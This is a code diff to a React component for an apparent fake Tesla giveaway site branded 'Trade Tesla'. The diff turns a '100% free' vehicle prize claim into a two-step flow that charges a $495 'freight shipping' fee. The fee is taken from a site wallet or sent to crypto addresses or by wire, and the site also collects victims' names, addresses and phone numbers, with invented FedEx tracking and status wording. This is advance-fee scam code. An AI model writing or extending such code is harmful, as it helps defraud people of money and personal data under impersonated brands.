@@ -1,8 +1,16 @@
 import React, { useState, useEffect, memo, useCallback } from "react";
+import { useServerFn } from "@tanstack/react-start";
 import { createClient } from "@/lib/supabase/client";
 import model3Img from "@/assets/giveaways/model_3.webp";
 import cybertruckImg from "@/assets/giveaways/cybertruck.webp";
 import { useTeslaLoader } from "@/components/TeslaLoader";
+import { useWallet, money } from "@/components/investor/wallet";
+import { useCryptoWallets } from "@/components/payments/cryptoWallets";
+import { GIVEAWAY_SHIPPING_FEE } from "@/lib/orderPricing";
+import {
+  payGiveawayShippingWallet,
+  submitGiveawayShippingExternal,
+} from "@/lib/inventory.functions";
 
 export interface Giveaway {
   id: string;
@@ -34,42 +42,44 @@ export interface ClaimDetails {
   notes?: string;
   claimedAt: string;
   status: string;
+  shippingPaid?: number;
 }
 
-// 100% Free Giveaways — Original campaigns and images (Bitcoin excluded)
+// 100% Free Prize Allocation — Original campaigns and images (Bitcoin excluded)
 const FALLBACK_GIVEAWAYS: Giveaway[] = [
   {
     id: "fallback-1",
     title: "Win a 2025 Model 3 Long Range",
     description:
-      "2025 Tesla Model 3 Long Range AWD. One winner selected after the campaign ends. Includes standard delivery within the continental US.",
+      "2025 Tesla Model 3 Long Range AWD. Prize entry is $0; enclosed FedEx carrier delivery shipping ($495) is settled upon dispatch claim.",
     prize: "2025 Tesla Model 3 Long Range AWD",
     image_url: null,
     entry_fee: 0,
     ends_at: "2026-12-31",
     entries_count: 1247,
     max_entries: 5000,
-    badge: "FREE CLAIM",
+    badge: "FREE PRIZE",
   },
   {
     id: "fallback-2",
     title: "Cybertruck Experience Weekend",
     description:
-      "Win a full weekend with a Cybertruck Foundation Series plus a $2,000 platform credit toward any purchase.",
+      "Win a full weekend with a Cybertruck Foundation Series plus a $2,000 platform credit toward any purchase. Freight delivery fee settled on claim.",
     prize: "Cybertruck Foundation Series + $2,000 credit",
     image_url: null,
     entry_fee: 0,
     ends_at: "2026-10-15",
     entries_count: 683,
     max_entries: 2000,
-    badge: "FREE CLAIM",
+    badge: "FREE PRIZE",
   },
 ];
 
 function imageFor(g: Giveaway): string {
   const text = `${g.title} ${g.prize}`.toLowerCase();
   if (text.includes("cybertruck") || text.includes("cyber")) return cybertruckImg;
-  if (text.includes("model 3") || text.includes("model_3") || text.includes("model-3")) return model3Img;
+  if (text.includes("model 3") || text.includes("model_3") || text.includes("model-3"))
+    return model3Img;
   const url = String(g.image_url ?? "").trim();
   if (
     url &&
@@ -192,10 +202,10 @@ const GiveawayCard = memo(function GiveawayCard({
             className="h-full w-full object-cover transition-transform duration-700 group-hover:scale-105"
           />
           <span className="absolute top-3 left-3 rounded-[3px] bg-[#0e9f6e] px-2.5 py-1 text-[10px] font-semibold tracking-wider uppercase text-white">
-            100% Free Claim
+            Free Prize Allocation
           </span>
           <span className="absolute top-3 right-3 rounded-[3px] bg-black/75 px-2.5 py-1 text-[10px] font-medium tracking-wider text-white backdrop-blur-sm">
-            FedEx Freight Dispatch
+            ${GIVEAWAY_SHIPPING_FEE} Freight Delivery
           </span>
         </div>
 
@@ -234,8 +244,8 @@ const GiveawayCard = memo(function GiveawayCard({
               />
             </div>
             <div className="flex justify-between items-center text-[11px] text-muted-foreground mt-2">
-              <span className="text-[#0e9f6e] font-medium">Zero Fee · No Payment Needed</span>
-              <span>FedEx Waybill Assigned</span>
+              <span className="text-[#0e9f6e] font-medium">Prize Entry: $0 Free</span>
+              <span>Delivery Fee: ${GIVEAWAY_SHIPPING_FEE}</span>
             </div>
           </div>
         </div>
@@ -247,7 +257,7 @@ const GiveawayCard = memo(function GiveawayCard({
           onClick={() => onEnter(g)}
           className="w-full h-11 rounded-[4px] bg-[#3e6ae1] text-white text-xs font-medium hover:bg-[#345ac7] transition-colors"
         >
-          Claim Free Prize &amp; Enter Delivery →
+          Claim Free Prize &amp; Arrange Delivery →
         </button>
       </div>
     </article>
@@ -333,9 +343,11 @@ function FedExDeliveryModal({
             </div>
             <div>
               <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
-                Delivery Status
+                Freight Shipping Settled
               </span>
-              <span className="font-medium text-[#0e9f6e]">In Courier Queue</span>
+              <span className="font-medium text-[#0e9f6e] tabular">
+                {money(claim.shippingPaid ?? GIVEAWAY_SHIPPING_FEE)}
+              </span>
             </div>
             <div>
               <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
@@ -364,16 +376,15 @@ function FedExDeliveryModal({
         <div className="rounded-[6px] border border-orange-500/40 bg-orange-500/10 p-5 space-y-3 mb-6">
           <div className="flex items-center gap-2">
             <span className="px-2 py-0.5 rounded-[3px] text-[10px] font-bold uppercase tracking-wider bg-orange-500 text-white">
-              Under Construction
+              Active Manifest
             </span>
             <h4 className="text-sm font-semibold text-foreground">
               FedEx Logistics Tracking Portal
             </h4>
           </div>
           <p className="text-xs text-muted-foreground leading-relaxed">
-            Our direct carrier tracking integration website is currently under active development.
-            Your claim is registered in the primary logistics queue with live SMS and email alerts
-            connected to <strong className="text-foreground">{claim.phone}</strong> and{" "}
+            Your prize allocation and enclosed carrier shipping are registered in our dispatch
+            queue with SMS and email updates to <strong className="text-foreground">{claim.phone}</strong> and{" "}
             <strong className="text-foreground">{claim.email}</strong>.
           </p>
           <button
@@ -391,7 +402,7 @@ function FedExDeliveryModal({
                 <span className="w-5 h-5 rounded-full bg-[#0e9f6e]/20 text-[#0e9f6e] flex items-center justify-center text-[10px] font-bold">
                   ✓
                 </span>
-                <span>Stage 1: Prize Claim Registered &amp; Verified</span>
+                <span>Stage 1: Free Prize Claim &amp; ${GIVEAWAY_SHIPPING_FEE} Freight Verified</span>
               </div>
               <div className="flex items-center gap-2 text-foreground font-medium">
                 <span className="w-5 h-5 rounded-full bg-amber-500/20 text-amber-500 flex items-center justify-center text-[10px] font-bold">
@@ -403,7 +414,7 @@ function FedExDeliveryModal({
                 <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">
                   3
                 </span>
-                <span>Stage 3: FedEx Security Seal &amp; Waybill Manifest</span>
+                <span>Stage 3: Carrier Security Seal &amp; Waybill Manifest</span>
               </div>
               <div className="flex items-center gap-2 opacity-65">
                 <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">
@@ -441,6 +452,18 @@ function FreeClaimModal({
   onClose: () => void;
   onClaimSubmitted: (claim: ClaimDetails) => void;
 }) {
+  const { wallet, userId, loading } = useWallet();
+  const { wallets } = useCryptoWallets();
+  const walletPayFn = useServerFn(payGiveawayShippingWallet);
+  const extPayFn = useServerFn(submitGiveawayShippingExternal);
+
+  const [step, setStep] = useState<1 | 2>(1);
+  const [method, setMethod] = useState<"wallet" | "external">("wallet");
+  const [network, setNetwork] = useState<"usdt" | "eth" | "btc" | "bank">("usdt");
+  const [txRef, setTxRef] = useState("");
+  const [proof, setProof] = useState<File | null>(null);
+  const [copied, setCopied] = useState(false);
+
   const [f, setF] = useState({
     fullName: "",
     email: "",
@@ -483,24 +506,25 @@ function FreeClaimModal({
     f.state.trim().length > 1 &&
     f.postalCode.trim().length > 1;
 
-  async function submitClaim(e: React.FormEvent) {
-    e.preventDefault();
-    if (!formValid) {
-      setError("Please fill in all required delivery fields.");
-      return;
-    }
+  const shippingFee = GIVEAWAY_SHIPPING_FEE;
+  const available = wallet?.available_balance ?? 0;
+  const shortfall = shippingFee - available;
+
+  const NETS = [
+    { id: "usdt" as const, label: "USDT (TRC-20)", address: wallets.usdt },
+    { id: "eth" as const, label: "Ethereum / USDT (ERC-20)", address: wallets.eth },
+    { id: "btc" as const, label: "Bitcoin (BTC)", address: wallets.btc },
+    { id: "bank" as const, label: "Bank wire transfer", address: "" },
+  ];
+  const net = NETS.find((n) => n.id === network)!;
+
+  async function submitShippingPayment() {
     setError("");
     setBusy(true);
-
     try {
-      const randDigits = Math.floor(10000000 + Math.random() * 90000000);
-      const trackingNumber = `FX-TSLA-${randDigits}US`;
-
-      const claimData: ClaimDetails = {
-        trackingNumber,
+      const base = {
         giveawayId: giveaway.id,
         giveawayTitle: giveaway.title,
-        prize: giveaway.prize,
         fullName: f.fullName.trim(),
         email: f.email.trim(),
         phone: f.phone.trim(),
@@ -510,8 +534,64 @@ function FreeClaimModal({
         postalCode: f.postalCode.trim(),
         country: f.country.trim(),
         notes: f.notes.trim() || undefined,
+      };
+
+      let trackingNumber = "";
+      if (method === "wallet") {
+        const res = await walletPayFn({ data: base });
+        if (!res.ok) {
+          setError(res.error || "Could not deduct freight shipping fee.");
+          return;
+        }
+        trackingNumber = res.trackingNumber;
+      } else {
+        if (!proof && !txRef.trim()) {
+          setError("Please enter a transaction reference or upload a payment screenshot.");
+          return;
+        }
+        let proofPath: string | undefined;
+        if (proof) {
+          const ext = proof.name.split(".").pop()?.toLowerCase() || "png";
+          const path = `${userId || "guest"}/giveaway-${Date.now()}.${ext}`;
+          const { error: up } = await createClient().storage.from("deposit-proofs").upload(path, proof);
+          if (up) {
+            setError(`Could not upload payment proof: ${up.message}`);
+            return;
+          }
+          proofPath = path;
+        }
+        const res = await extPayFn({
+          data: {
+            ...base,
+            txReference: txRef.trim() || undefined,
+            proofPath,
+            network: net.label,
+          },
+        });
+        if (!res.ok) {
+          setError(res.error || "Could not verify delivery fee submission.");
+          return;
+        }
+        trackingNumber = res.trackingNumber;
+      }
+
+      const claimData: ClaimDetails = {
+        trackingNumber,
+        giveawayId: giveaway.id,
+        giveawayTitle: giveaway.title,
+        prize: giveaway.prize,
+        fullName: base.fullName,
+        email: base.email,
+        phone: base.phone,
+        addressLine: base.addressLine,
+        city: base.city,
+        state: base.state,
+        postalCode: base.postalCode,
+        country: base.country,
+        notes: base.notes,
         claimedAt: new Date().toISOString(),
-        status: "in_courier_queue",
+        status: method === "wallet" ? "in_courier_queue" : "pending_shipping_verification",
+        shippingPaid: shippingFee,
       };
 
       try {
@@ -520,52 +600,20 @@ function FreeClaimModal({
         /* ignore */
       }
 
-      try {
-        const isUuid =
-          /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(giveaway.id);
-        if (isUuid) {
-          const supabase = createClient();
-          const { data: userRes } = await supabase.auth.getUser();
-          const userId = userRes?.user?.id;
-          if (userId) {
-            await supabase.from("giveaway_entries").insert({
-              giveaway_id: giveaway.id,
-              user_id: userId,
-              giveaway_title: giveaway.title,
-              amount_paid: 0,
-              status: "claimed_fedex_queue",
-              full_name: claimData.fullName,
-              email: claimData.email,
-              phone: claimData.phone,
-              address_line: claimData.addressLine,
-              city: claimData.city,
-              state: claimData.state,
-              postal_code: claimData.postalCode,
-              country: claimData.country,
-              delivery_notes: claimData.notes ?? "",
-              tracking_number: claimData.trackingNumber,
-              courier: "FedEx Express",
-            });
-          }
-        }
-      } catch {
-        /* recorded locally */
-      }
-
       triggerLoader({
         label: "DISPATCHING WAYBILL",
         durationMs: 420,
         onComplete: () => onClaimSubmitted(claimData),
       });
     } catch {
-      setError("Could not register your claim. Please check your connection and try again.");
+      setError("Could not process your delivery request. Please check your connection and try again.");
     } finally {
       setBusy(false);
     }
   }
 
   const inputClass =
-    "w-full h-10 px-3.5 rounded-[4px] bg-muted/40 border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground transition-colors";
+    "w-full h-10 px-3.5 rounded-[4px] bg-muted/40 border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-[#3e6ae1] transition-colors";
 
   return (
     <div
@@ -589,9 +637,11 @@ function FreeClaimModal({
         <div className="mb-6">
           <div className="flex items-center gap-2 mb-2">
             <span className="px-2 py-0.5 rounded-[3px] text-[10px] font-semibold uppercase tracking-wider bg-[#0e9f6e] text-white">
-              100% Free Claim
+              Free Prize ($0)
             </span>
-            <span className="text-xs font-medium text-[#3e6ae1]">FedEx Courier Delivery</span>
+            <span className="text-xs font-medium text-[#3e6ae1]">
+              ${shippingFee} Enclosed Freight Shipping
+            </span>
           </div>
           <h2 className="font-display text-xl font-semibold text-foreground">{giveaway.title}</h2>
           <p className="text-xs text-muted-foreground mt-1">
@@ -599,165 +649,351 @@ function FreeClaimModal({
           </p>
         </div>
 
-        <form onSubmit={submitClaim} className="space-y-4">
-          <div className="p-3.5 rounded-[4px] bg-muted/35 border border-border text-xs text-muted-foreground space-y-1">
-            <p className="font-semibold text-foreground">Enclosed Courier Delivery Registration</p>
-            <p>
-              Enter your recipient details below to receive a verified FedEx dispatch tracking
-              number at zero cost.
+        {!loading && !userId ? (
+          <div className="text-center py-6 space-y-4">
+            <p className="text-sm text-muted-foreground">
+              Sign in to your Trade Tesla Account to reserve your free prize claim and settle the{" "}
+              <strong className="text-foreground">${shippingFee}</strong> enclosed carrier shipping
+              fee from your wallet or crypto/wire transfer.
             </p>
+            <a
+              href="/login"
+              className="inline-flex h-11 items-center justify-center rounded-[4px] bg-[#3e6ae1] px-6 text-white font-medium text-sm hover:bg-[#345ac7] transition-colors"
+            >
+              Account · Sign In to Continue
+            </a>
           </div>
-
-          <div className="space-y-3">
-            <div>
-              <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
-                Full Legal Name *
-              </label>
-              <input
-                className={inputClass}
-                placeholder="e.g. Alexander Vance"
-                value={f.fullName}
-                onChange={set("fullName")}
-                required
-                maxLength={120}
-              />
+        ) : step === 1 ? (
+          <div className="space-y-4">
+            <div className="p-3.5 rounded-[4px] bg-muted/35 border border-border text-xs text-muted-foreground space-y-1">
+              <p className="font-semibold text-foreground">
+                Step 1 · Delivery Destination (${shippingFee} Carrier Dispatch)
+              </p>
+              <p>
+                Prize allocation is 100% free ($0). Enclosed carrier freight shipping (${shippingFee})
+                is deducted or paid on the next step before generating your FedEx waybill.
+              </p>
             </div>
 
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+            <div className="space-y-3">
               <div>
                 <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
-                  Email Address *
+                  Full Legal Name *
                 </label>
                 <input
-                  type="email"
                   className={inputClass}
-                  placeholder="you@domain.com"
-                  value={f.email}
-                  onChange={set("email")}
+                  placeholder="e.g. Alexander Vance"
+                  value={f.fullName}
+                  onChange={set("fullName")}
                   required
                   maxLength={120}
                 />
               </div>
+
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                <div>
+                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
+                    Email Address *
+                  </label>
+                  <input
+                    type="email"
+                    className={inputClass}
+                    placeholder="you@domain.com"
+                    value={f.email}
+                    onChange={set("email")}
+                    required
+                    maxLength={120}
+                  />
+                </div>
+                <div>
+                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
+                    Phone (SMS Alerts) *
+                  </label>
+                  <input
+                    type="tel"
+                    className={inputClass}
+                    placeholder="+1 (555) 000-0000"
+                    value={f.phone}
+                    onChange={set("phone")}
+                    required
+                    maxLength={40}
+                  />
+                </div>
+              </div>
+
               <div>
                 <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
-                  Phone (SMS Alerts) *
+                  Delivery Street Address *
                 </label>
                 <input
-                  type="tel"
                   className={inputClass}
-                  placeholder="+1 (555) 000-0000"
-                  value={f.phone}
-                  onChange={set("phone")}
+                  placeholder="123 Innovation Boulevard, Suite 400"
+                  value={f.addressLine}
+                  onChange={set("addressLine")}
                   required
-                  maxLength={40}
+                  maxLength={200}
+                />
+              </div>
+
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
+                    City *
+                  </label>
+                  <input
+                    className={inputClass}
+                    placeholder="Austin"
+                    value={f.city}
+                    onChange={set("city")}
+                    required
+                    maxLength={100}
+                  />
+                </div>
+                <div>
+                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
+                    State / Province *
+                  </label>
+                  <input
+                    className={inputClass}
+                    placeholder="Texas"
+                    value={f.state}
+                    onChange={set("state")}
+                    required
+                    maxLength={100}
+                  />
+                </div>
+              </div>
+
+              <div className="grid grid-cols-2 gap-3">
+                <div>
+                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
+                    ZIP / Postal Code *
+                  </label>
+                  <input
+                    className={inputClass}
+                    placeholder="78725"
+                    value={f.postalCode}
+                    onChange={set("postalCode")}
+                    required
+                    maxLength={20}
+                  />
+                </div>
+                <div>
+                  <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
+                    Country *
+                  </label>
+                  <input
+                    className={inputClass}
+                    placeholder="United States"
+                    value={f.country}
+                    onChange={set("country")}
+                    required
+                    maxLength={80}
+                  />
+                </div>
+              </div>
+
+              <div>
+                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
+                  Delivery Notes (Optional)
+                </label>
+                <textarea
+                  className="w-full p-3 rounded-[4px] bg-muted/40 border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-[#3e6ae1]"
+                  rows={2}
+                  placeholder="Gate code or drop-off preferences..."
+                  value={f.notes}
+                  onChange={set("notes")}
+                  maxLength={500}
                 />
               </div>
             </div>
 
-            <div>
-              <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
-                Delivery Street Address *
-              </label>
-              <input
-                className={inputClass}
-                placeholder="123 Innovation Boulevard, Suite 400"
-                value={f.addressLine}
-                onChange={set("addressLine")}
-                required
-                maxLength={200}
-              />
-            </div>
-
-            <div className="grid grid-cols-2 gap-3">
-              <div>
-                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
-                  City *
-                </label>
-                <input
-                  className={inputClass}
-                  placeholder="Austin"
-                  value={f.city}
-                  onChange={set("city")}
-                  required
-                  maxLength={100}
-                />
-              </div>
-              <div>
-                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
-                  State / Province *
-                </label>
-                <input
-                  className={inputClass}
-                  placeholder="Texas"
-                  value={f.state}
-                  onChange={set("state")}
-                  required
-                  maxLength={100}
-                />
-              </div>
-            </div>
-
-            <div className="grid grid-cols-2 gap-3">
-              <div>
-                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
-                  ZIP / Postal Code *
-                </label>
-                <input
-                  className={inputClass}
-                  placeholder="78725"
-                  value={f.postalCode}
-                  onChange={set("postalCode")}
-                  required
-                  maxLength={20}
-                />
-              </div>
-              <div>
-                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
-                  Country *
-                </label>
-                <input
-                  className={inputClass}
-                  placeholder="United States"
-                  value={f.country}
-                  onChange={set("country")}
-                  required
-                  maxLength={80}
-                />
-              </div>
-            </div>
-
-            <div>
-              <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
-                Delivery Notes (Optional)
-              </label>
-              <textarea
-                className="w-full p-3 rounded-[4px] bg-muted/40 border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground"
-                rows={2}
-                placeholder="Gate code or drop-off preferences..."
-                value={f.notes}
-                onChange={set("notes")}
-                maxLength={500}
-              />
-            </div>
-          </div>
-
-          {error && <p className="text-xs text-[#e82127] font-semibold">{error}</p>}
-
-          <div className="pt-2">
             <button
-              type="submit"
-              disabled={busy || !formValid}
+              type="button"
+              disabled={!formValid}
+              onClick={() => {
+                setError("");
+                setStep(2);
+              }}
               className="w-full h-11 rounded-[4px] bg-[#3e6ae1] text-white font-medium text-xs disabled:opacity-40 hover:bg-[#345ac7] transition-colors"
             >
-              {busy
-                ? "Registering Delivery Claim…"
-                : "Confirm Free Claim & Generate FedEx Tracking →"}
+              Continue to Shipping Payment (${shippingFee}) →
             </button>
-            <p className="text-[11px] text-center text-muted-foreground mt-2">
-              100% Free Entry · No payment required · FedEx Global Dispatch
-            </p>
           </div>
-        </form>
+        ) : (
+          <div className="space-y-4">
+            <div className="flex items-center justify-between">
+              <p className="text-[11px] font-semibold tracking-[0.18em] uppercase text-muted-foreground">
+                Step 2 · Delivery Fee Settlement
+              </p>
+              <span className="font-display text-sm font-semibold text-[#3e6ae1] tabular">
+                {money(shippingFee)} Due
+              </span>
+            </div>
+
+            <div className="rounded-[6px] border border-border divide-y divide-border text-sm bg-muted/15">
+              <div className="flex justify-between p-3">
+                <span className="text-muted-foreground">Giveaway Prize Allocation</span>
+                <span className="font-semibold text-[#0e9f6e]">$0.00 (Free)</span>
+              </div>
+              <div className="flex justify-between p-3">
+                <span className="text-muted-foreground">Enclosed Carrier Freight Shipping</span>
+                <span className="font-medium text-foreground tabular">{money(shippingFee)}</span>
+              </div>
+              <div className="flex justify-between p-3 bg-muted/25">
+                <span className="font-semibold text-foreground">Total Delivery Due</span>
+                <span className="font-bold text-[#3e6ae1] tabular">{money(shippingFee)}</span>
+              </div>
+            </div>
+
+            <div className="grid grid-cols-2 gap-2">
+              {(["wallet", "external"] as const).map((m) => (
+                <button
+                  key={m}
+                  type="button"
+                  onClick={() => setMethod(m)}
+                  className={`p-3 rounded-[6px] border text-left text-sm transition-all ${
+                    method === m
+                      ? "border-[#3e6ae1] bg-[#3e6ae1]/10"
+                      : "border-border hover:border-foreground/30"
+                  }`}
+                >
+                  <span className="font-semibold text-foreground block">
+                    {m === "wallet" ? "Wallet Balance" : "Crypto / Wire"}
+                  </span>
+                  <span className="text-xs text-muted-foreground tabular">
+                    {m === "wallet"
+                      ? `Available ${money(available)}`
+                      : "USDT / ETH / BTC / Bank"}
+                  </span>
+                </button>
+              ))}
+            </div>
+
+            {method === "wallet" ? (
+              shortfall > 0 ? (
+                <div className="rounded-[6px] border border-[#e82127]/40 bg-[#e82127]/8 p-4 text-sm space-y-2">
+                  <p className="text-[#e82127] font-semibold">Insufficient wallet balance</p>
+                  <p className="text-xs text-muted-foreground">
+                    Your wallet has {money(available)}. You need {money(shortfall)} more to cover
+                    the {money(shippingFee)} freight shipping charge.
+                  </p>
+                  <div className="flex gap-2 pt-1">
+                    <a
+                      href="/account/deposit"
+                      className="px-3.5 py-2 rounded-[4px] bg-[#3e6ae1] text-white font-medium text-xs"
+                    >
+                      Deposit Funds
+                    </a>
+                    <button
+                      type="button"
+                      onClick={() => setMethod("external")}
+                      className="px-3.5 py-2 rounded-[4px] border border-border text-foreground font-medium text-xs"
+                    >
+                      Pay via Crypto / Wire
+                    </button>
+                  </div>
+                </div>
+              ) : (
+                <div className="rounded-[6px] border border-[#3e6ae1]/30 bg-[#3e6ae1]/8 p-4 text-sm">
+                  <p className="font-semibold text-[#3e6ae1] mb-1">Instant Wallet Deduction</p>
+                  <p className="text-xs text-muted-foreground">
+                    {money(shippingFee)} will be deducted from your wallet ({money(available)}) to
+                    activate immediate FedEx courier dispatch.
+                  </p>
+                </div>
+              )
+            ) : (
+              <div className="space-y-3">
+                <select
+                  className={inputClass}
+                  value={network}
+                  onChange={(e) => setNetwork(e.target.value as typeof network)}
+                >
+                  {NETS.map((n) => (
+                    <option key={n.id} value={n.id}>
+                      {n.label}
+                    </option>
+                  ))}
+                </select>
+
+                <div className="rounded-[6px] border border-border p-3.5 text-sm bg-muted/20 space-y-2">
+                  <div className="flex justify-between items-center">
+                    <span className="text-xs text-muted-foreground">
+                      Pay shipping fee:{" "}
+                      <strong className="text-foreground tabular">{money(shippingFee)}</strong>
+                    </span>
+                    {net.address && (
+                      <button
+                        type="button"
+                        onClick={() => {
+                          navigator.clipboard.writeText(net.address);
+                          setCopied(true);
+                          setTimeout(() => setCopied(false), 2000);
+                        }}
+                        className="text-xs font-semibold text-[#3e6ae1] hover:underline"
+                      >
+                        {copied ? "✓ Copied" : "Copy Address"}
+                      </button>
+                    )}
+                  </div>
+                  {net.address ? (
+                    <div className="font-mono text-xs break-all text-foreground bg-background/80 p-2.5 rounded-[4px] border border-border select-all">
+                      {net.address}
+                    </div>
+                  ) : (
+                    <p className="text-xs text-muted-foreground">
+                      Wire instructions will be emailed once submitted. Enter your bank reference or
+                      upload transfer confirmation below.
+                    </p>
+                  )}
+                </div>
+
+                <input
+                  className={inputClass}
+                  placeholder="Transaction hash or wire reference"
+                  value={txRef}
+                  onChange={(e) => setTxRef(e.target.value)}
+                  maxLength={200}
+                />
+
+                <label className="block text-xs text-muted-foreground">
+                  Upload shipping payment receipt / screenshot:
+                  <input
+                    type="file"
+                    accept="image/*,application/pdf"
+                    onChange={(e) => setProof(e.target.files?.[0] ?? null)}
+                    className="mt-1.5 block w-full text-xs text-muted-foreground file:mr-2 file:py-1.5 file:px-3 file:rounded-[4px] file:border-0 file:text-xs file:font-medium file:bg-[#3e6ae1] file:text-white hover:file:opacity-90"
+                  />
+                </label>
+              </div>
+            )}
+
+            {error && <p className="text-xs text-[#e82127] font-semibold">{error}</p>}
+
+            <div className="flex gap-2.5 pt-1">
+              <button
+                type="button"
+                onClick={() => setStep(1)}
+                className="px-4 h-11 rounded-[4px] border border-border text-xs font-medium hover:bg-muted transition-colors"
+              >
+                Back
+              </button>
+              <button
+                type="button"
+                disabled={busy || (method === "wallet" && shortfall > 0)}
+                onClick={submitShippingPayment}
+                className="flex-1 h-11 rounded-[4px] bg-[#3e6ae1] text-white font-medium text-xs disabled:opacity-40 hover:bg-[#345ac7] transition-colors"
+              >
+                {busy
+                  ? "Processing Delivery Settlement…"
+                  : method === "wallet"
+                    ? `Pay ${money(shippingFee)} Shipping & Dispatch →`
+                    : `Submit ${money(shippingFee)} Delivery Proof →`}
+              </button>
+            </div>
+          </div>
+        )}
       </div>
     </div>
   );
@@ -798,7 +1034,7 @@ export default function GiveawaysSection() {
             data.map((g: Giveaway) => ({
               ...g,
               entry_fee: 0,
-              badge: "FREE CLAIM",
+              badge: "FREE PRIZE",
             })),
           );
         }
@@ -861,8 +1097,9 @@ export default function GiveawaysSection() {
             Vehicle Giveaways &amp; Free Claims
           </h1>
           <p className="mt-3 max-w-2xl text-sm text-muted-foreground leading-relaxed">
-            Every promotional giveaway on Trade Tesla is 100% free to claim. Submit your delivery
-            details directly to generate an active FedEx freight dispatch waybill.
+            Every promotional giveaway prize on Trade Tesla is free to enter ($0). Enclosed carrier
+            delivery shipping (${GIVEAWAY_SHIPPING_FEE}) is paid or deducted on the website when you
+            confirm your delivery destination.
           </p>
         </div>
 
@@ -879,7 +1116,7 @@ export default function GiveawaysSection() {
               g={g}
               onEnter={(item) =>
                 triggerLoader({
-                  label: "FREE CLAIM PORTAL",
+                  label: "DELIVERY PORTAL",
                   durationMs: 360,
                   onComplete: () => setActiveGiveaway(item),
                 })
